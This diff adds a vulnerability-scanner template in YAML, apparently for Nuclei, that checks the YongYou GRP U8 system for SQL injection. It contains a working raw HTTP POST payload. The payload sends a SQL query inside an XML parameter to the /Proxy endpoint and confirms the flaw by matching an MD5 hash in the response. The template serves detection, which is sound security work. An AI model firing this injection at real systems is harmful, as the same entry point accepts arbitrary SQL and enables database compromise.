@@ -1,0 +1,22 @@
+id: poc-yaml-yongyou-grpu8-system-sqli
+info:
+  name: YongYou GRP U8 System SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    This template detects SQL injection vulnerability in the YongYou GRP U8 system.
+http:
+  - raw:
+      - |
+        POST /Proxy HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        cVer=9.8.0&dp=<?xml version="1.0" encoding="GB2312"?><R9PACKET version="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION><NAME>AS_DataRequest</NAME><PARAMS><PARAM><NAME>ProviderName</NAME><DATA format="text">DataSetProviderData</DATA></PARAM><PARAM><NAME>Data</NAME><DATA format="text">select HashBytes('MD5','admin')</DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET>
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "21232F297A57A5A743894A0E4A801FC3"
